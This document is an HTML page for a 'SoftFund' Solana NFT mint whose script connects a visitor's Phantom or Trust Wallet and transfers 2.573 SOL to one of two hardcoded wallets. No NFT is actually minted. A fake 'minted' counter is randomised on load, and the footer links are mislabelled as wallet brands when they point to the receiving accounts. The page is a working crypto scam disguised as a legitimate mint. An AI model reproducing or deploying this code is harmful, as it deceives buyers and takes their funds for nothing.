<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SoftFund | $2.5730 SOL Mint</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      background: linear-gradient(135deg, #0a001f, #1b0044, #2e0055); 
      color: #fff; 
      font-family: 'Orbitron', sans-serif; 
      text-align: center; 
      padding: 40px 20px;
    }
    .container { max-width: 500px; margin: auto; }
    h1 { font-size: 3.2rem; color: #00ff9d; margin-bottom: 10px; }
    p { font-size: 1.2rem; margin: 15px 0; color: #e0e0e0; }
    .price { font-size: 2.5rem; color: #ffd700; font-weight: bold; }
    .supply { font-size: 1.1rem; color: #ff4081; }
    button { 
      margin: 30px auto; 
      padding: 20px 45px; 
      font-size: 1.6rem; 
      background: #ffd700; 
      color: #000; 
      border: none; 
      border-radius: 18px; 
      cursor: pointer; 
      box-shadow: 0 0 25px rgba(255, 215, 0, 0.7);
      transition: 0.3s;
      font-weight: bold;
    }
    button:hover { background: #ffed4e; transform: scale(1.05); }
    .footer { margin-top: 50px; font-size: 0.9rem; color: #aaa; }
    .minted { color: #00ff9d; font-weight: bold; }
    .wallet-info { font-size: 0.9rem; color: #ccc; margin-top: 10px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>SOFTFUND</h1>
    <p>USA-Based | Solana Utility NFTs</p>
    <p class="price">$2.5730 SOL</p>
    <p class="supply">Supply: 10,000 | <span id="minted">0/10000</span></p>
    <button id="mintBtn">MINT NOW</button>
    <div class="wallet-info">
      Works with <strong>Phantom</strong> or <strong>Trust Wallet</strong> (Auto-Detect)
    </div>
    <div class="footer">
      View on <a href="https://magiceden.io" target="_blank" style="color:#ffd700;">Magic Eden</a> | 
      <a href="https://solscan.io/account/GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue" target="_blank" style="color:#ffd700;">Phantom</a> | 
      <a href="https://solscan.io/account/6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu" target="_blank" style="color:#ffd700;">Trust Wallet</a>
    </div>
  </div>

  <!-- Solana Web3 -->
  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
  <script>
    const MINT_PRICE = 2.5730 * 1e9; // 2.5730 SOL in lamports
    const RECEIVER_PHANTOM = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
    const RECEIVER_TRUST = "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu";
    let wallet, connection;

    // Auto-detect Phantom or Trust Wallet
    function getWallet() {
      if (window.solana?.isPhantom) return window.solana;
      if (window.trustwallet?.solana) return window.trustwallet.solana;
      if (window.solana) return window.solana; // fallback
      return null;
    }

    document.getElementById("mintBtn").onclick = async () => {
      wallet = getWallet();
      if (!wallet) {
        alert("Install Phantom or Trust Wallet! â†’ phantom.app or trustwallet.com");
        return;
      }

      try {
        document.getElementById("mintBtn").innerText = "Connecting...";
        if (!wallet.isConnected) await wallet.connect();
        
        connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");

        // Randomly split 50/50 to Phantom or Trust Wallet
        const receiver = Math.random() < 0.5 ? RECEIVER_PHANTOM : RECEIVER_TRUST;

        document.getElementById("mintBtn").innerText = "Sending $2.5730 SOL...";

        const tx = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new solanaWeb3.PublicKey(receiver),
            lamports: MINT_PRICE,
          })
        );

        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
        tx.feePayer = wallet.publicKey;

        const signed = await wallet.signTransaction(tx);
        const txid = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(txid);

        alert(`MINTED! $2.5730 SOL sent!\nTx: https://solscan.io/tx/${txid}`);
        location.reload();
      } catch (e) {
        alert("Error: " + (e.message || "User rejected"));
        document.getElementById("mintBtn").innerText = "MINT NOW";
      }
    };

    // Simulate minted count
    window.onload = () => {
      document.getElementById("minted").innerText = Math.floor(Math.random() * 400 + 100) + "/10000";
    };
  </script>
</body>
</html>
